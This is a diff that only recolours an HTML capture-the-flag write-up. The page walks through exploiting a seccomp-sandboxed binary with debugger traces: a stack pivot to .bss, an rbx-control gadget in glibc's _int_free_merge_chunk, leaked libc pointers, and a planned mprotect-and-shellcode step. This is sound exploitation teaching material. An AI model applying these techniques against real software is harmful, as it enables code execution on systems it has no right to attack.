@@ -220,24 +220,24 @@ Anyways, the wisdom of God makes itself apparent in the <span class='monospace'>
 <pre><code>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f5fc647444d e84ec70700            &lt;_int_free_maybe_consolidate.part.0+0x46d&gt;   call   0x7f5fc64f0ba0 &lt;__stack_chk_fail&gt;
 </span>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f5fc6474452 66662e0f1f84000000..  &lt;NO_SYMBOL&gt;   data16 cs nop WORD PTR [rax+rax*1+0x0]</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f5fc647445d 0f1f00                &lt;NO_SYMBOL&gt;   nop    DWORD PTR [rax]</span>
-<span style="color:#cf222e;">*</span>-&gt; <span style="color:#cf222e;">0x7f5fc6474460</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4156                </span> <span style="color:#cf222e;"> &lt;_int_free_merge_chunk&gt;</span>   <span style="color:#6e7781;">push  </span> <span style="color:#0550ae;">r14</span>
+<span style="color:#cf222e;">*</span>-&gt; <span style="color:#0550ae;">0x7f5fc6474460</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4156                </span> <span style="color:#cf222e;"> &lt;_int_free_merge_chunk&gt;</span>   <span style="color:#6e7781;">push  </span> <span style="color:#0550ae;">r14</span>
     0x7f5fc6474462 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4155                </span>  &lt;_int_free_merge_chunk+0x2&gt;   <span style="color:#6e7781;">push  </span> <span style="color:#0550ae;">r13</span>
     0x7f5fc6474464 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4c8d2c16            </span>  &lt;_int_free_merge_chunk+0x4&gt;   <span style="color:#6e7781;">lea   </span> <span style="color:#0550ae;">r13</span><span style="color:#6e7781;">, [</span><span style="color:#0550ae;">rsi</span> <span style="color:#6e7781;">+</span> <span style="color:#0550ae;">rdx</span> <span style="color:#6e7781;">*</span> <span style="color:#cf222e;">1</span><span style="color:#6e7781;">]</span>
     0x7f5fc6474468 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4154                </span>  &lt;_int_free_merge_chunk+0x8&gt;   <span style="color:#6e7781;">push  </span> <span style="color:#0550ae;">r12</span>
     0x7f5fc647446a <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">55                  </span>  &lt;_int_free_merge_chunk+0xa&gt;   <span style="color:#6e7781;">push  </span> <span style="color:#0550ae;">rbp</span>
     0x7f5fc647446b <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">53                  </span>  &lt;_int_free_merge_chunk+0xb&gt;   <span style="color:#6e7781;">push  </span> <span style="color:#0550ae;">rbx</span>
 <span style="color:#cf222e;">----------------------------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:944135</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7f5fc6474460</span> &lt;_int_free_merge_chunk&gt;, reason: <span style="color:#8250df;">BREAKPOINT</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:944135</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7f5fc6474460</span> &lt;_int_free_merge_chunk&gt;, reason: <span style="color:#8250df;">BREAKPOINT</span>
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x7f5fc6474460</span> &lt;_int_free_merge_chunk&gt;
-[ <span style="color:#8250df;">#1</span>] <span style="color:#cf222e;">0x7f5fc64746c6</span> &lt;_int_free_chunk+0x126&gt;
-[ <span style="color:#8250df;">#2</span>] <span style="color:#cf222e;">0x7f5fc64773c0</span> &lt;free+0x180&gt; (frame name: <span style="color:#953800;">_int_free</span>)
-[ <span style="color:#8250df;">#3</span>] <span style="color:#cf222e;">0x7f5fc64773c0</span> &lt;free+0x180&gt; (frame name: <span style="color:#953800;">__GI___libc_free</span>)
-[ <span style="color:#8250df;">#4</span>] <span style="color:#cf222e;">0x7f5fc65d3730</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#8250df;">#5</span>] <span style="color:#cf222e;">0x7f5fc65d3781</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#8250df;">#6</span>] <span style="color:#cf222e;">0x7f5fc65d37cd</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#8250df;">#7</span>] <span style="color:#cf222e;">0x0000004013f0</span> &lt;seccomp_+0x19f&gt;
-[ <span style="color:#8250df;">#8</span>] <span style="color:#cf222e;">0x00000040147f</span> &lt;main+0x8c&gt;
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x7f5fc6474460</span> &lt;_int_free_merge_chunk&gt;
+[ <span style="color:#8250df;">#1</span>] <span style="color:#0550ae;">0x7f5fc64746c6</span> &lt;_int_free_chunk+0x126&gt;
+[ <span style="color:#8250df;">#2</span>] <span style="color:#0550ae;">0x7f5fc64773c0</span> &lt;free+0x180&gt; (frame name: <span style="color:#953800;">_int_free</span>)
+[ <span style="color:#8250df;">#3</span>] <span style="color:#0550ae;">0x7f5fc64773c0</span> &lt;free+0x180&gt; (frame name: <span style="color:#953800;">__GI___libc_free</span>)
+[ <span style="color:#8250df;">#4</span>] <span style="color:#0550ae;">0x7f5fc65d3730</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#8250df;">#5</span>] <span style="color:#0550ae;">0x7f5fc65d3781</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#8250df;">#6</span>] <span style="color:#0550ae;">0x7f5fc65d37cd</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#8250df;">#7</span>] <span style="color:#0550ae;">0x0000004013f0</span> &lt;seccomp_+0x19f&gt;
+[ <span style="color:#8250df;">#8</span>] <span style="color:#0550ae;">0x00000040147f</span> &lt;main+0x8c&gt;
 [ <span style="color:#8250df;">#9</span>] 0x00000000000a &lt;NO_SYMBOL&gt;
 [...]
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------------------
@@ -246,44 +246,44 @@ Anyways, the wisdom of God makes itself apparent in the <span class='monospace'>
 
 When <span class='monospace'>_int_free_create_chunk</span> is called from <span class='monospace'>_int_free_merge_chunk</span>, it is done so at a very specific offset near the function epilogue, which pushes a return address on the stack that we can use as as an <span class='monospace'>rbx</span> control gadget.
 
-<pre><code>   <span style="color:#cf222e;">0x7f5fc64744f3</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+147&gt;:	<span style="color:#116329;">call   </span><span style="color:#cf222e;">0x7f5fc6473040</span> &lt;<span style="color:#953800;">_int_free_create_chunk</span>&gt;
-   <span style="color:#cf222e;">0x7f5fc64744f8</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+152&gt;:	<span style="color:#116329;">cmp    </span><span style="color:#cf222e;">rax</span>,<span style="color:#cf222e;">0xffff</span>
-   <span style="color:#cf222e;">0x7f5fc64744fe</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+158&gt;:	<span style="color:#116329;">ja     </span><span style="color:#cf222e;">0x7f5fc6474510</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+176&gt;
-   <span style="color:#cf222e;">0x7f5fc6474500</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+160&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">rbx</span>
-   <span style="color:#cf222e;">0x7f5fc6474501</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+161&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">rbp</span>
-   <span style="color:#cf222e;">0x7f5fc6474502</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+162&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">r12</span>
-   <span style="color:#cf222e;">0x7f5fc6474504</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+164&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">r13</span>
-   <span style="color:#cf222e;">0x7f5fc6474506</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+166&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">r14</span>
-   <span style="color:#cf222e;">0x7f5fc6474508</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+168&gt;:	<span style="color:#116329;">ret</span>
+<pre><code>   <span style="color:#0550ae;">0x7f5fc64744f3</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+147&gt;:	<span style="color:#116329;">call   </span><span style="color:#0550ae;">0x7f5fc6473040</span> &lt;<span style="color:#953800;">_int_free_create_chunk</span>&gt;
+   <span style="color:#0550ae;">0x7f5fc64744f8</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+152&gt;:	<span style="color:#116329;">cmp    </span><span style="color:#cf222e;">rax</span>,<span style="color:#cf222e;">0xffff</span>
+   <span style="color:#0550ae;">0x7f5fc64744fe</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+158&gt;:	<span style="color:#116329;">ja     </span><span style="color:#0550ae;">0x7f5fc6474510</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+176&gt;
+   <span style="color:#0550ae;">0x7f5fc6474500</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+160&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">rbx</span>
+   <span style="color:#0550ae;">0x7f5fc6474501</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+161&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">rbp</span>
+   <span style="color:#0550ae;">0x7f5fc6474502</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+162&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">r12</span>
+   <span style="color:#0550ae;">0x7f5fc6474504</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+164&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">r13</span>
+   <span style="color:#0550ae;">0x7f5fc6474506</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+166&gt;:	<span style="color:#116329;">pop    </span><span style="color:#cf222e;">r14</span>
+   <span style="color:#0550ae;">0x7f5fc6474508</span> &lt;<span style="color:#953800;">_int_free_merge_chunk</span>+168&gt;:	<span style="color:#116329;">ret</span>
 </code></pre>
 
 We can see that after calling <span class='monospace'>main</span> with our stack pivoted to <span class='monospace'>.bss</span>, this <span class='monospace'>rbx</span> control gadget (<span class='monospace'>_int_free_merge_chunk+152</span>) would be placed on the stack for us to freely return to. There is a <span class='monospace'>cmp rax, 0xffff</span> here but this is, thankfully, irrelevant. We can control our writes and write our needed values of <span class='monospace'>rbx</span> below the region of <span class='monospace'>.bss</span> where this return address happens to land, and then use a <span class='monospace'>leave ; ret</span> to pivot <span class='monospace'>rsp</span> on top of that gadget. Below is a list of all <span class='monospace'>libc</span> pointers sprayed onto <span class='monospace'>.bss</span> once we stack pivot and return to <span class='monospace'>main</span>:
 
-<pre><code><span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404208</span>  -&gt;  <span style="color:#cf222e;">0x00007f5fc64760bc</span> &lt;_int_malloc+0xe1c&gt;  -&gt;  0xf7e3e908244c8b48
+<pre><code><span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404208</span>  -&gt;  <span style="color:#0550ae;">0x00007f5fc64760bc</span> &lt;_int_malloc+0xe1c&gt;  -&gt;  0xf7e3e908244c8b48
 <span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404240</span>  -&gt;  <span style="color:#116329;">0x00007f5fc65bbac0</span> &lt;main_arena&gt;  -&gt;  0x0000000000000000
-<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x00000000004042b8</span>  -&gt;  <span style="color:#cf222e;">0x00007f5fc64773c0</span> &lt;free+0x180&gt;  -&gt;  0x0000441f0f66d6eb
+<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x00000000004042b8</span>  -&gt;  <span style="color:#0550ae;">0x00007f5fc64773c0</span> &lt;free+0x180&gt;  -&gt;  0x0000441f0f66d6eb
 <span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404428</span>  -&gt;  <span style="color:#6e7781;">0x00007f5fc65b9fd0</span> &lt;_IO_file_jumps&gt;  -&gt;  0x0000000000000000
-<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404468</span>  -&gt;  <span style="color:#cf222e;">0x00007f5fc6453947</span> &lt;_IO_getline_info+0x127&gt;  -&gt;  0x048d490824448b4c
-<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x00000000004044c8</span>  -&gt;  <span style="color:#cf222e;">0x00007f5fc645270a</span> &lt;fgets+0x9a&gt;  -&gt;  0xc08548db3100558b
-<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404ca8</span>  -&gt;  <span style="color:#cf222e;">0x00007f5fc64730cd</span> &lt;_int_free_create_chunk+0x8d&gt;  -&gt;  0xd801480824448b48
-<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404cd8</span>  -&gt;  <span style="color:#cf222e;">0x00007f5fc64744f8</span> &lt;_int_free_merge_chunk+0x98&gt;  -&gt;  0x10770000ffff3d48
-<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404d28</span>  -&gt;  <span style="color:#cf222e;">0x00007f5fc64773c0</span> &lt;free+0x180&gt;  -&gt;  0x0000441f0f66d6eb
+<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404468</span>  -&gt;  <span style="color:#0550ae;">0x00007f5fc6453947</span> &lt;_IO_getline_info+0x127&gt;  -&gt;  0x048d490824448b4c
+<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x00000000004044c8</span>  -&gt;  <span style="color:#0550ae;">0x00007f5fc645270a</span> &lt;fgets+0x9a&gt;  -&gt;  0xc08548db3100558b
+<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404ca8</span>  -&gt;  <span style="color:#0550ae;">0x00007f5fc64730cd</span> &lt;_int_free_create_chunk+0x8d&gt;  -&gt;  0xd801480824448b48
+<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404cd8</span>  -&gt;  <span style="color:#0550ae;">0x00007f5fc64744f8</span> &lt;_int_free_merge_chunk+0x98&gt;  -&gt;  0x10770000ffff3d48
+<span style="color:#953800;">chall_patched</span>: <span style="color:#116329;">0x0000000000404d28</span>  -&gt;  <span style="color:#0550ae;">0x00007f5fc64773c0</span> &lt;free+0x180&gt;  -&gt;  0x0000441f0f66d6eb
 </code></pre>
 
 Note our gadget of interest at <span class='monospace'>0x404cd8</span> in the binary. Yay!<br><br>
 
 We can view the region of memory below that saved return address. As it stands, there is a lot of garbage that we will need to eventually overwrite, because as it stands, if we use this gadget with these garbage values, we will not only fill our registers with junk, but we'll also eventually return to a junk address.
 
-<pre><code>      <span style="color:#cf222e;">0x000000404cd8</span>|+0x0008|+001: <span style="color:#cf222e;">0x00007fee59d3d4f8</span> &lt;_int_free_merge_chunk+0x98&gt;  -&gt;  0x10770000ffff3d48
-      <span style="color:#cf222e;">0x000000404ce0</span>|+0x0010|+002: 0xc9202d3bcede358c
-      <span style="color:#cf222e;">0x000000404ce8</span>|+0x0018|+003: <span style="color:#8250df;">0x000000000e548700</span>  -&gt;  0x0000000000000001
-$rsp  <span style="color:#cf222e;">0x000000404cf0</span>|+0x0020|+004: <span style="color:#116329;">0x00007fee59e848e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad2088<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  $r15</span>
-      <span style="color:#cf222e;">0x000000404cf8</span>|+0x0028|+005: <span style="color:#cf222e;">0x00007fee59d2c6ad</span> &lt;__syscall_cancel+0xd&gt;  -&gt;  0xf0003dd06348595a<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[1]</span>
-      <span style="color:#cf222e;">0x000000404d00</span>|+0x0030|+006: 0x0000000000000000
-      <span style="color:#cf222e;">0x000000404d08</span>|+0x0038|+007: <span style="color:#8250df;">0x000000000e54b540</span>  -&gt;  0x0000000000000000
-      <span style="color:#cf222e;">0x000000404d10</span>|+0x0040|+008: 0xffffffffffffff88
-      <span style="color:#cf222e;">0x000000404d18</span>|+0x0048|+009: <span style="color:#cf222e;">0x00007fee59da0ea6</span> &lt;read+0x16&gt;  -&gt;  0x441f0fc318c48348<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[2]</span>
-      <span style="color:#cf222e;">0x000000404d20</span>|+0x0050|+010: 0x0000000000000000</code></pre>
+<pre><code>      <span style="color:#0550ae;">0x000000404cd8</span>|+0x0008|+001: <span style="color:#0550ae;">0x00007fee59d3d4f8</span> &lt;_int_free_merge_chunk+0x98&gt;  -&gt;  0x10770000ffff3d48
+      <span style="color:#0550ae;">0x000000404ce0</span>|+0x0010|+002: 0xc9202d3bcede358c
+      <span style="color:#0550ae;">0x000000404ce8</span>|+0x0018|+003: <span style="color:#8250df;">0x000000000e548700</span>  -&gt;  0x0000000000000001
+$rsp  <span style="color:#0550ae;">0x000000404cf0</span>|+0x0020|+004: <span style="color:#116329;">0x00007fee59e848e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad2088<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  $r15</span>
+      <span style="color:#0550ae;">0x000000404cf8</span>|+0x0028|+005: <span style="color:#0550ae;">0x00007fee59d2c6ad</span> &lt;__syscall_cancel+0xd&gt;  -&gt;  0xf0003dd06348595a<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[1]</span>
+      <span style="color:#0550ae;">0x000000404d00</span>|+0x0030|+006: 0x0000000000000000
+      <span style="color:#0550ae;">0x000000404d08</span>|+0x0038|+007: <span style="color:#8250df;">0x000000000e54b540</span>  -&gt;  0x0000000000000000
+      <span style="color:#0550ae;">0x000000404d10</span>|+0x0040|+008: 0xffffffffffffff88
+      <span style="color:#0550ae;">0x000000404d18</span>|+0x0048|+009: <span style="color:#0550ae;">0x00007fee59da0ea6</span> &lt;read+0x16&gt;  -&gt;  0x441f0fc318c48348<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[2]</span>
+      <span style="color:#0550ae;">0x000000404d20</span>|+0x0050|+010: 0x0000000000000000</code></pre>
 
 
 Anyways, what do we do after we get <span class='monospace'>rbx</span> control? Typically, we just use <span class='monospace'>rbx</span> to increment some <span class='monospace'>libc</span> address to a one-gadget and win, but one-gadgets will not work due to seccomp. Indeed, the challenge requires us to eventually <span class='monospace'>mprotect</span> a RWX page and write some shellcode leveraging some arcane syscalls to leak the flag from the child process. This is practically impossible to do without help from our good buddy <span class='monospace'>libc</span>, so a <span class='monospace'>libc</span> leak should be our next target here.
@@ -359,25 +359,25 @@ Note the weird 'juggling' we're doing with these two writes. The first write pre
 
 We can carefully look at each step as it is executed.
 
-<pre><code><span style="color:#cf222e;">$r15</span>: <span style="color:#6e7781;">0x0000000000403df0</span> &lt;__do_global_dtors_aux_fini_array_entry&gt;  -&gt;  <span style="color:#cf222e;">0x0000000000401190</span> &lt;__do_global_dtors_aux&gt;  -&gt;  0x2f0d3d80fa1e0ff3
+<pre><code><span style="color:#cf222e;">$r15</span>: <span style="color:#6e7781;">0x0000000000403df0</span> &lt;__do_global_dtors_aux_fini_array_entry&gt;  -&gt;  <span style="color:#0550ae;">0x0000000000401190</span> &lt;__do_global_dtors_aux&gt;  -&gt;  0x2f0d3d80fa1e0ff3
 <span style="color:#cf222e;">$fs_base</span>: <span style="color:#116329;">0x00007f7e5bdf0740</span>  -&gt;  [loop detected]
 <span style="color:#cf222e;">$gs_base</span>: 0x0000000000000000
 <span style="color:#cf222e;">$eflags</span>: 0x293 [ident align vx86 resume nested overflow direction <span style="font-weight:bold;">INTERRUPT</span> trap <span style="font-weight:bold;">SIGN</span> zero <span style="font-weight:bold;">ADJUST</span> parity <span style="font-weight:bold;">CARRY</span>] [Ring=3]
 <span style="color:#cf222e;">$cs</span>: 0x0033 <span style="color:#cf222e;">$ss</span>: 0x002b <span style="color:#cf222e;">$ds</span>: 0x0000 <span style="color:#cf222e;">$es</span>: 0x0000 <span style="color:#cf222e;">$fs</span>: 0x0000 <span style="color:#cf222e;">$gs</span>: 0x0000
 <span style="color:#cf222e;">-------------------------------------------------------------------------------------------------------------------------------------------------- stack ----
-</span>$rsp  <span style="color:#cf222e;">0x000000404ce0</span>|+0x0000|+000: 0x00000000000000e0
-      <span style="color:#cf222e;">0x000000404ce8</span>|+0x0008|+001: <span style="color:#116329;">0x00000000004040dd</span>  -&gt;  0x0000000000000000
-      <span style="color:#cf222e;">0x000000404cf0</span>|+0x0010|+002: 0x000000000000000c
-      <span style="color:#cf222e;">0x000000404cf8</span>|+0x0018|+003: 0x000000000000000d
-      <span style="color:#cf222e;">0x000000404d00</span>|+0x0020|+004: 0x000000000000000e
-      <span style="color:#cf222e;">0x000000404d08</span>|+0x0028|+005: <span style="color:#cf222e;">0x00000000004011ac</span> &lt;__do_global_dtors_aux+0x1c&gt;  -&gt;  0x2e6666c390c35d01<span style="color:#cf222e;">  &lt;-  retaddr[1]</span>
-      <span style="color:#cf222e;">0x000000404d10</span>|+0x0030|+006: <span style="color:#cf222e;">0x00000000004011ad</span> &lt;__do_global_dtors_aux+0x1d&gt;  -&gt;  0x0f2e6666c390c35d<span style="color:#cf222e;">  &lt;-  retaddr[2]</span>
-      <span style="color:#cf222e;">0x000000404d18</span>|+0x0038|+007: <span style="color:#116329;">0x0000000000404330</span>  -&gt;  <span style="color:#6e7781;">0x000000000040000a</span>  -&gt;  0x0000000000000000<span style="color:#cf222e;">  &lt;-  retaddr[3]</span>
+</span>$rsp  <span style="color:#0550ae;">0x000000404ce0</span>|+0x0000|+000: 0x00000000000000e0
+      <span style="color:#0550ae;">0x000000404ce8</span>|+0x0008|+001: <span style="color:#116329;">0x00000000004040dd</span>  -&gt;  0x0000000000000000
+      <span style="color:#0550ae;">0x000000404cf0</span>|+0x0010|+002: 0x000000000000000c
+      <span style="color:#0550ae;">0x000000404cf8</span>|+0x0018|+003: 0x000000000000000d
+      <span style="color:#0550ae;">0x000000404d00</span>|+0x0020|+004: 0x000000000000000e
+      <span style="color:#0550ae;">0x000000404d08</span>|+0x0028|+005: <span style="color:#0550ae;">0x00000000004011ac</span> &lt;__do_global_dtors_aux+0x1c&gt;  -&gt;  0x2e6666c390c35d01<span style="color:#cf222e;">  &lt;-  retaddr[1]</span>
+      <span style="color:#0550ae;">0x000000404d10</span>|+0x0030|+006: <span style="color:#0550ae;">0x00000000004011ad</span> &lt;__do_global_dtors_aux+0x1d&gt;  -&gt;  0x0f2e6666c390c35d<span style="color:#cf222e;">  &lt;-  retaddr[2]</span>
+      <span style="color:#0550ae;">0x000000404d18</span>|+0x0038|+007: <span style="color:#116329;">0x0000000000404330</span>  -&gt;  <span style="color:#6e7781;">0x000000000040000a</span>  -&gt;  0x0000000000000000<span style="color:#cf222e;">  &lt;-  retaddr[3]</span>
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------------------ code: x86:64 (gdb-native) ----
 </span>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f7e5be934f3 e848ebffff            &lt;_int_free_merge_chunk+0x93&gt;   call   0x7f7e5be92040 &lt;_int_free_create_chunk&gt;</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f7e5be934f8 483dffff0000          &lt;_int_free_merge_chunk+0x98&gt;   cmp    rax, 0xffff</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f7e5be934fe 7710                  &lt;_int_free_merge_chunk+0x9e&gt;   ja     0x7f7e5be93510 &lt;_int_free_merge_chunk+176&gt;</span>
- -&gt; <span style="color:#cf222e;">0x7f7e5be93500</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5b                  </span> <span style="color:#cf222e;"> &lt;_int_free_merge_chunk+0xa0&gt;</span>   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbx</span>
+ -&gt; <span style="color:#0550ae;">0x7f7e5be93500</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5b                  </span> <span style="color:#cf222e;"> &lt;_int_free_merge_chunk+0xa0&gt;</span>   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbx</span>
     0x7f7e5be93501 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5d                  </span>  &lt;_int_free_merge_chunk+0xa1&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbp</span>
     0x7f7e5be93502 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">415c                </span>  &lt;_int_free_merge_chunk+0xa2&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">r12</span>
     0x7f7e5be93504 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">415d                </span>  &lt;_int_free_merge_chunk+0xa4&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">r13</span>
@@ -390,7 +390,7 @@ First, our hijacked <span class='monospace'>_int_free_merge_chunk</span> gadget.
 </span>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f7e5be93502 415c                  &lt;_int_free_merge_chunk+0xa2&gt;   pop    r12</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f7e5be93504 415d                  &lt;_int_free_merge_chunk+0xa4&gt;   pop    r13</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f7e5be93506 415e                  &lt;_int_free_merge_chunk+0xa6&gt;   pop    r14</span>
- -&gt; <span style="color:#cf222e;">0x7f7e5be93508</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">c3                  </span> <span style="color:#cf222e;"> &lt;_int_free_merge_chunk+0xa8&gt;</span>   <span style="color:#8250df;">ret   </span>
+ -&gt; <span style="color:#0550ae;">0x7f7e5be93508</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">c3                  </span> <span style="color:#cf222e;"> &lt;_int_free_merge_chunk+0xa8&gt;</span>   <span style="color:#8250df;">ret   </span>
 
    -&gt; 0x4011ac <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">015dc3              </span>  &lt;__do_global_dtors_aux+0x1c&gt;   <span style="color:#6e7781;">add   </span> <span style="color:#0550ae;">DWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rbp</span> <span style="color:#6e7781;">-</span> <span style="color:#cf222e;">0x3d</span><span style="color:#6e7781;">], </span><span style="color:#0550ae;">ebx</span>
       0x4011af <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">90                  </span>  &lt;__do_global_dtors_aux+0x1f&gt;   <span style="color:#6e7781;">nop   </span>
@@ -405,10 +405,10 @@ First, our hijacked <span class='monospace'>_int_free_merge_chunk</span> gadget.
     0x7f7e5be93514 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5d                  </span>  &lt;_int_free_merge_chunk+0xb4&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbp</span>
     0x7f7e5be93515 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">415c                </span>  &lt;_int_free_merge_chunk+0xb5&gt;   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">r12</span>
 <span style="color:#cf222e;">-------------------------------------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:965899</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7f7e5be93508</span> &lt;_int_free_merge_chunk+0xa8&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:965899</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7f7e5be93508</span> &lt;_int_free_merge_chunk+0xa8&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">---------------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x7f7e5be93508</span> &lt;_int_free_merge_chunk+0xa8&gt;
-[ <span style="color:#8250df;">#1</span>] <span style="color:#cf222e;">0x0000004011ac</span> &lt;__do_global_dtors_aux+0x1c&gt;
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x7f7e5be93508</span> &lt;_int_free_merge_chunk+0xa8&gt;
+[ <span style="color:#8250df;">#1</span>] <span style="color:#0550ae;">0x0000004011ac</span> &lt;__do_global_dtors_aux+0x1c&gt;
 </code></pre>
 
 Then, our eventual return to the <span class='monospace'>add</span> gadget, which points <span class='monospace'>stderr</span> to <span class='monospace'>stdout</span>.
@@ -423,9 +423,9 @@ Then, our eventual return to the <span class='monospace'>add</span> gadget, whic
    <span style="color:#cf222e;">$r9</span> = 0x0000000000000000,
 )
 <span style="color:#cf222e;">-------------------------------------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:973820</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x0000004013c9</span> &lt;seccomp_+0x178&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
